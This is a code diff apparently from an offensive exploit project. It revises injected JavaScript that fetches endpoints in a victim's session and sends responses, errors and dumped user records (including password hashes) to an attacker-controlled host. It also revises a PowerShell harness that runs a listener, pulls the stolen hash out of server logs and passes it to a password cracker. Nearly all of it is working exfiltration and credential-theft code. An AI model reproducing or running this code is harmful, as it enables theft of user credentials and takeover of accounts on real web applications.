@@ -40,20 +40,20 @@ setInterval(() => {
 // very basic
 function doRequest(endpoint, cfg) {
   fetch(endpoint, cfg).then(async (response) => {
-      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
+      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
         mode: "cors",
       });   
-      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
+      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
         mode: "cors",
       });
     if(response.status < 400) {
       let data = await response.text();
-      fetch(``http://`${attacker_ip}/?exfil=`` + data.length, {
+      fetch(``http://`${attacker_ip}/exfil?value=`` + data.length, {
         mode: "cors",
       });
     }
   }).catch((error) => {
-      fetch(``http://`${attacker_ip}/?error=`` + error, {
+      fetch(``http://`${attacker_ip}/error?value=`` + error, {
         mode: "cors",
       });   
   });
@@ -62,10 +62,10 @@ function doRequest(endpoint, cfg) {
 // extract hash
 function extractHash(endpoint, cfg) {
   fetch(endpoint, cfg).then(async (response) => {
-      fetch(``http://`${attacker_ip}/?endpoint=`` + endpoint, {
+      fetch(``http://`${attacker_ip}/endpoint?value=`` + endpoint, {
       mode: "cors",
       });   
-      fetch(``http://`${attacker_ip}/?status_code=`` + response.status, {
+      fetch(``http://`${attacker_ip}/status_code?value=`` + response.status, {
       mode: "cors",
       });
     if(response.status < 400) {
@@ -75,13 +75,13 @@ function extractHash(endpoint, cfg) {
       let users = xmlDoc.getElementsByTagName("user");
       let hash='';
       for(let i = 0; i < users.length; ++i) {
-        fetch(``http://`${attacker_ip}/?exfil=user_dump&value=`` + xmlDoc.getElementsByTagName("user")[i].innerHTML, {
+        fetch(``http://`${attacker_ip}/exfil?value=`` + encodeURIComponent(xmlDoc.getElementsByTagName("user")[i].innerHTML), {
           mode: "cors",
         });
       }
   }
   }).catch((error) => {
-      fetch(``http://`${attacker_ip}/?error=`` + error, {
+      fetch(``http://`${attacker_ip}/error?value=`` + error, {
         mode: "cors",
       });   
   });
@@ -99,27 +99,18 @@ Write-Output "Webserver Started, Start simulation";
 # Start cors server and wait for exfile data
 $server_job = Start-Job -ScriptBlock { python3 ./simple-cors-http-server.py 80 }
 $server_logs = '';
-$queryParams = @()
+$hash = '';
 while($True) {
   $server_logs = Receive-Job -Job $server_job -Keep *>&1;
-  $magic_string = $server_logs | Select-String -Pattern 'zinhart';
+  $magic_string = $server_logs | Select-String -Pattern '.*zinhart.*';
   # sls -Pattern '(\?exfil=hash&value=[^\s]+)'
   if($magic_string.Matches.Length -gt 0) {
-    $match = $server_logs | Select-String -Pattern '(\?exfil=hash&value=[^\s]+)';
-    $match.Matches.value
-    <#
-    $ParsedQueryString = [System.Web.HttpUtility]::ParseQueryString($match.Matches.value)
-    $i = 0
-    foreach($QueryStringObject in $ParsedQueryString){
-        $queryObject = New-Object -TypeName psobject
-        $queryObject | Add-Member -MemberType NoteProperty -Name Query -Value $QueryStringObject
-        #$queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $ParsedQueryString[$i];# ParseQueryString transforms + into a whitespace character, which cucks us
-        $queryObject | Add-Member -MemberType NoteProperty -Name Value -Value $($ParsedQueryString[$i] -replace ' ','+');
-        $queryParams += $queryObject
-        $i++
-    }
-    #>
-    #$queryParams
+    #$magic_string.Matches
+    $match = $magic_string.Matches.value | Select-String -Pattern '(exfil\?value=[^\s]+)';
+    #$match.Matches
+    $decodedURLParameters = [System.Web.HttpUtility]::UrlDecode($match.Matches.value)
+    $hash = ($decodedURLParameters | Select-String -Pattern '<password>(.*?)</password>').Matches.groups[1].value;
+    #$hash
     $end_time = [DateTimeOffset]::UtcNow.ToUnixTimeMilliseconds();
     break;
   }
@@ -127,12 +118,10 @@ while($True) {
 
 
 ## run password cracker
-<#
 javac PasswordCracker.java;
-java PasswordCracker.java "$start_time" "$end_time" "$($queryParams.value)"
-#>
-$server_logs
-Write-Output $start_time $end_time $queryParams.value;
+java PasswordCracker.java "$start_time" "$end_time" "$hash"
+#$server_logs
+#Write-Output $start_time $end_time $hash;
 
 # cleanup
 Remove-Job -Job $server_job -Force;
